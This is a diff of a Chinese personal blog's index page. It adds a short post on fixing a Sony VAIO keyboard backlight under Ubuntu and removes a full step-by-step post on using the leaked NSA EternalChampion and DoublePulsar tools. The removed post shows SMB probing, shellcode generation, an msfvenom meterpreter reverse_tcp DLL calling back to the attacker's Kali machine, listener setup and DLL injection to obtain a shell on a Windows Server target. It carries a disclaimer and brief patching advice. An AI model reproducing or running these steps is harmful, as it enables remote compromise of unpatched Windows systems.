@@ -73,6 +73,57 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-ubuntu-kbd/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2017/08/03/ubuntu-kbd/index/" class="article-date">
+  <time class="dt-published" datetime="2017-08-03T00:00:00.000Z" itemprop="datePublished">2017-08-03</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/it/">it</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2017/08/03/ubuntu-kbd/index/">Ubuntu下SONY VAIO SVF15217SCW 键盘背光问题</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>刚刚发现一个很奇怪的问题，笔记本键盘背光在Ubuntu竟然是不亮的。好吧，再准确些，POST和GRUB的时候是亮的，启动到Ubuntu的过程中就自己不亮了。而这货的默认设置是按任意键键盘灯亮，15秒之后熄灭。经过一番搜索，在askubuntu上发现这似乎是一个比较难搞的bug……还好，俺解决了。 <a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/08/2017080314291748.png"><img src="/images/2017080314291748.png"></a> 只要打开终端执行这两条命令，键盘灯就应该亮了</p>
+<p>sudo modprobe -r sony_laptop<br>sudo modprobe -v sony_laptop kbd_backlight&#x3D;1</p>
+<p>自动化点该怎么办？alias下，<code>sudo NOPASSWD</code>放到<code>/etc/rc.local</code></p>
+<h2 id="查看电脑具体型号"><a href="#查看电脑具体型号" class="headerlink" title="查看电脑具体型号"></a>查看电脑具体型号</h2><p>sudo dmidecode -s system-product-name</p>
+<h2 id="查看模块信息"><a href="#查看模块信息" class="headerlink" title="查看模块信息"></a>查看模块信息</h2><p>modinfo sony-laptop</p>
+<h2 id="关于背光的更多参数"><a href="#关于背光的更多参数" class="headerlink" title="关于背光的更多参数"></a>关于背光的更多参数</h2><p><code>kbd_backlight</code>: 0 禁用背光；1 启动自动背光（定时熄灭）；2 常亮背光 <code>kbd_backlight_timeout</code>: 0-3代表不同的背光自动熄灭时间。</p>
+<p>不过好像小键盘就不能用了？？？</p>
+<p>参考资料</p>
+<p><a target="_blank" rel="noopener" href="https://askubuntu.com/questions/475711/turn-off-keyboard-back-light-sony-vaio-svf1521dcxw">https://askubuntu.com/questions/475711/turn-off-keyboard-back-light-sony-vaio-svf1521dcxw</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2017/08/03/ubuntu-kbd/index/" data-id="clhp7rtmp00aes2qr7ujtgvuu" data-title="Ubuntu下SONY VAIO SVF15217SCW 键盘背光问题" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-wifi-cracking/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2017/07/26/wifi-cracking/index/" class="article-date">
@@ -930,107 +981,6 @@
 
 
   
-    <article id="post-eternalchampion/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2017/05/16/eternalchampion/index/" class="article-date">
-  <time class="dt-published" datetime="2017-05-16T00:00:00.000Z" itemprop="datePublished">2017-05-16</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/justsay/">justsay</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2017/05/16/eternalchampion/index/">[ShadowBroker]2: NSA工具集EternalChampion漏洞复现、ShellcodeBuffer</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>[v_error]警告： 本文<strong>仅供实验性研究</strong>，请勿用于非法用途，出啥事我不负责。真的！别算我头上，我胆小害怕。[&#x2F;v_error]</p>
-<p>目前，某些特定版本的Windows 10也可以了，可以参见这个PR <a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/pull/9473">https://github.com/rapid7/metasploit-framework/pull/9473</a></p>
-<p>话说几天之前<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/WannaCry">WannaCry</a>的爆发真是让EternalBlue又火了一番，不少学校、公司都中招了。可不，我的博客都蹭热度有了前所未有的800PV（还是UV）。</p>
-<p>我想起来三个多星期之前曾经写过<a target="_blank" rel="noopener" href="https://dmesg.app/shadowbroker.html">《EternalBlue+Doublepulsar+meterpreter渗透Windows》</a>，EternalBlue使用几乎是没有门槛，但是有的时候会不支持某些特定的操作系统，此时就要使用其他的Eternal系列了，比如说EternalChampion。</p>
-<p>但是在使用EternalChampion的时候，发现它需要<code>ShellcodeBuffer</code>，如下图所示，按照常理讲，这玩意不应该运行了就啪啪啪植入后门了么？</p>
-<p><img src="/images/051617_0646_ShadowBroke1.png"></p>
-<p>ShellcodeBuffer :: DOPU Shellcode buffer</p>
-<p>类似地，EternalRomance也需要Shellcode，不像EternalBlue那样直接一路回车就行了。</p>
-<p>有些人的第一想法可能是用msf生成一个shellcode，然后在这里指定文件，但实际上这样做会似的目标机器蓝屏的，为啥，因为这玩意需要<code>DOPU Shellcode</code>，DOPU是啥，哎，不就是<strong>DO</strong>uble<strong>PU</strong>lsar吗？</p>
-<p>所以，此次咱们就从SMB出发，看看能用上啥漏洞利用工具吧！</p>
-<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>此次配置环境和上篇差不多</p>
-<h3 id="攻击机1"><a href="#攻击机1" class="headerlink" title="攻击机1"></a>攻击机1</h3><p>带有漏洞利用工具集的XP，并且此次需要准备好<a target="_blank" rel="noopener" href="http://www.winhex.com/winhex/">WinHex</a>， IP 172.26.97.35</p>
-<h3 id="攻击机2"><a href="#攻击机2" class="headerlink" title="攻击机2"></a>攻击机2</h3><p>Kali， IP 172.26.97.226</p>
-<h3 id="靶机"><a href="#靶机" class="headerlink" title="靶机"></a>靶机</h3><p>Windows Server 2008 SP1 x86， IP 202.X.X.X，已经开启445端口</p>
-<h2 id="开启FuzzBunch"><a href="#开启FuzzBunch" class="headerlink" title="开启FuzzBunch"></a>开启FuzzBunch</h2><p>不知道怎么运行FuzzBunch的，请参考我的<a target="_blank" rel="noopener" href="https://dmesg.app/shadowbroker.html">上篇博文</a>，操作方式和上次一样。<code>TargetIP</code>写靶机IP 202.X.X.X，<code>CallBack</code>写运行fb的IP，也就是172.26.97.35，不使用Redirection</p>
-<p><img src="/images/051617_0646_ShadowBroke2.png"></p>
-<h2 id="使用smbtouch探测"><a href="#使用smbtouch探测" class="headerlink" title="使用smbtouch探测"></a>使用smbtouch探测</h2><p>use smbtouch<br>execute</p>
-<p>smbtouch会为我们探测出目标系统适用的漏洞利用程序</p>
-<p><img src="/images/051617_0646_ShadowBroke3.png"></p>
-<p>在这里我们可以看到，目标系统是32位的，EternalBlue和EternalSynergy不支持攻击靶机，EternalRomance无法攻击，<strong>只有</strong>EternalChampion可以。</p>
-<h2 id="使用Doublepulsar生成shellcode"><a href="#使用Doublepulsar生成shellcode" class="headerlink" title="使用Doublepulsar生成shellcode"></a>使用Doublepulsar生成shellcode</h2><p>smbtouch成功之后，我们使用Doublepulsar来生成shellcode</p>
-<p>use Doublepulsar</p>
-<p>我们一路回车默认，会发现多出来一个名为<code>OutputInstall</code>的选项，选择这个</p>
-<p><img src="/images/051617_0646_ShadowBroke4.png"></p>
-<p>然后输入路径，比如说<code>C:\shellcode.bin</code>，一路回车执行就会生成shellcode</p>
-<h2 id="将shellcode转换成HEX"><a href="#将shellcode转换成HEX" class="headerlink" title="将shellcode转换成HEX"></a>将shellcode转换成HEX</h2><p>由于EternalChampion需要的是<code>ShellcodeBuffer</code>而不是<code>ShellcodeFile</code>，所以这里我们需要将Doublepulsar生成的shellcode转换成十六进制；如果你用的是EternalRomance，那么应该用的是<code>ShellcodeFile</code>，可以跨过此步</p>
-<p>使用WinHex打开我们刚刚生成的<code>shellcode.bin</code>，然后选择<code>Edit-Copy All-Hex Values</code>，如下图所示：</p>
-<p><img src="/images/051617_0646_ShadowBroke5.png"></p>
-<h2 id="使用EternalChampion进行攻击"><a href="#使用EternalChampion进行攻击" class="headerlink" title="使用EternalChampion进行攻击"></a>使用EternalChampion进行攻击</h2><p>现在shellcode已经在我们的剪贴板中了，我们就要使用EternalChampion来进行攻击了。</p>
-<p>use EternalChampion</p>
-<p>一路回车，在程序提示<code>ShellcodeBuffer :: DOPU Shellcode buffer</code>时右键粘贴进那一堆十六进制，由于Shellcode比较长（4KB），所以可能会花几秒钟才会粘贴完。有人反应直接输入4096、50也行。</p>
-<p><img src="/images/051617_0646_ShadowBroke6.png"></p>
-<p>在之后我们一路回车默认，信息应该都是和目标系统相符的。在<code>Mode :: Delivery mechanism</code>时像上次一样选择FB</p>
-<p><img src="/images/051617_0646_ShadowBroke7.png"></p>
-<p>之后程序会进行询问，我们回车就能够运行EternalChampion</p>
-<p>啊哟， 赢了，金牌，NSA你们这群人真幽默……</p>
-<p><img src="/images/051617_0646_ShadowBroke8.png"></p>
-<p>注意：如果你是用的exploit需要<code>Shellcode File</code>，那么这里直接输入shellcode的路径，本例中为<code>C:\shellcode.bin</code>，推荐把shellcode放在根目录，据GitHub上某人的回复，如果放在某个目录下可能会导致exploit不认。</p>
-<h2 id="使用Doublepulsar注入恶意dll"><a href="#使用Doublepulsar注入恶意dll" class="headerlink" title="使用Doublepulsar注入恶意dll"></a>使用Doublepulsar注入恶意dll</h2><p>在这之后，我们使用Doublepulsar注入恶意dll，和上次操作基本一致，这里我们就再复述下吧</p>
-<p>但是在此之前，我想看看后门是否存在，那就Doublepulsar中的选择<code>function: 1 ping</code>，就可以确定后门是否存在啦</p>
-<p><img src="/images/051617_0646_ShadowBroke9.png"></p>
-<p>好，咱还是生成恶意dll并用Doublepulsar注入吧！</p>
-<h3 id="msfvenom生成恶意dll"><a href="#msfvenom生成恶意dll" class="headerlink" title="msfvenom生成恶意dll"></a>msfvenom生成恶意dll</h3><p>切换到Kali，此次就使用<code>reverse_tcp</code>了</p>
-<p>#32位操作系统，所以生成32位的dll<br>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;172.26.97.226 LPORT&#x3D;8089 -f dll &gt;badbad.dll<br>#打开MetaSploit，开始监听；如果靶机是64位系统，自行更换<br>set PAYLOAD windows&#x2F;meterpreter&#x2F;reverse_tcp<br>use exploit&#x2F;multi&#x2F;handler<br>set LHOST 172.26.97.226<br>set LPORT 8089<br>run</p>
-<p>之后将这个dll拷贝到XP中，使用Python创建个http服务器</p>
-<p>python –m SimpleHTTPServer 80</p>
-<p>拿起久违的IE，下载这个<code>badbad.dll</code>文件</p>
-<h3 id="注入dll"><a href="#注入dll" class="headerlink" title="注入dll"></a>注入dll</h3><p>use DoublePulsar</p>
-<p>一路回车默认，只需要选择<code>function 2 Run DLL</code>，输入我们的dll文件路径</p>
-<p><img src="/images/051617_0646_ShadowBroke10.png"></p>
-<p>然后最后直接运行，就会发现反弹成功，拿到权限了！</p>
-<p><img src="/images/051617_0646_ShadowBroke11.png"></p>
-<h2 id="啊哟，执行不了meterpreter命令？"><a href="#啊哟，执行不了meterpreter命令？" class="headerlink" title="啊哟，执行不了meterpreter命令？"></a>啊哟，执行不了meterpreter命令？</h2><p>在一些情况下，我们可能会拿到meterpreter的会话，但是可能会发现执行不了啥命令，ping下不通了，猜测目标机器蓝屏了，那咋办呢？</p>
-<p>等等直到ping通，然后再次运行EternalChampion攻击，它会记得我们输入的shellcode，所以一路回车，然后再次运行Doublepulsar，在程序提示<code>ProcessName [lsass.exe]:</code>选择其他的以<code>NT Authority\System</code>运行的进程名，比如说<code>spoolsv.exe, SearchIndexer.exe, lsm.exe</code>，这就自己试试了。然后就应该不会蓝屏啦~</p>
-<p>其实选择啥进程其实都是可以的，大不了运行meterpreter的时候<code>migrate</code>到其他进程就可以了。</p>
-<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><h3 id="EternalBlue支持的系统"><a href="#EternalBlue支持的系统" class="headerlink" title="EternalBlue支持的系统"></a>EternalBlue支持的系统</h3><p>通过查看xml文件能发现，有点奇怪，EternalBlue的配置文件中支持了这么多系统，但是有时却报告不支持。</p>
-<p><img src="/images/051617_0646_ShadowBroke12.png"></p>
-<h3 id="Special？"><a href="#Special？" class="headerlink" title="Special？"></a>Special？</h3><p>大家能看到，EternalBlue和EternalChampion是在<code>Windows\Specials</code>这个目录下，Special，足以看到这俩工具威力是多么巨大吧！真是可怕……</p>
-<h3 id="防范手段"><a href="#防范手段" class="headerlink" title="防范手段"></a>防范手段</h3><p>安装SM17-010补丁，开启防火墙过滤445，关闭SMB服务。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2017/05/16/eternalchampion/index/" data-id="clhp7rtga002rs2qrf7zk0865" data-title="[ShadowBroker]2: NSA工具集EternalChampion漏洞复现、ShellcodeBuffer" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -1075,7 +1025,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/09/">September 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/08/">August 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/07/">July 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/04/">April 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/03/">March 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/02/">February 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">December 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/02/">February 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">January 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/">September 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">July 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">June 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/05/">May 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">February 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">December 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">November 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">June 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">February 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">September 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">July 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/04/">April 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">March 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/02/">February 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">November 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/10/">October 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">September 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/06/">June 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/05/">May 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/04/">April 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/03/">March 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/02/">February 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">January 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/12/">December 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">October 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">September 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/05/">May 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">April 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">March 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/02/">February 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/01/">January 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/12/">December 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">November 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/10/">October 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/09/">September 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/08/">August 2015</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/10/">October 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/09/">September 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/08/">August 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/07/">July 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/04/">April 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/03/">March 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/02/">February 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">December 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/02/">February 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">January 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/">September 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">July 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">June 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/05/">May 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">February 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">December 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">November 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">June 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">February 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">September 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">July 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/04/">April 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">March 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/02/">February 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">November 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/10/">October 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">September 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/06/">June 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/05/">May 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/04/">April 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/03/">March 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/02/">February 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">January 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/12/">December 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">October 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">September 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/05/">May 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">April 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">March 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/02/">February 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/01/">January 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/12/">December 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">November 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/10/">October 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/09/">September 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/08/">August 2015</a></li></ul>
     </div>
   </div>
 
@@ -1086,6 +1036,10 @@
     <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2024/10/06/aca-vm-scale/index/">Azure Container Apps 连接到虚拟机并配置CPU自动缩放</a>
+          </li>
         
           <li>
             <a href="/2024/09/28/worker-image-metadata/index/">使用 Cloudflare Worker获取图片元数据</a>
@@ -1101,10 +1055,6 @@
         
           <li>
             <a href="/2024/08/03/stripe-fraud/index/">Stripe 如何安全收款并避免盗刷与测卡</a>
-          </li>
-        
-          <li>
-            <a href="/2024/07/27/hide-in-cf/index/">隐藏于 Cloudflare 的全球网络之中</a>
           </li>
         
       </ul>
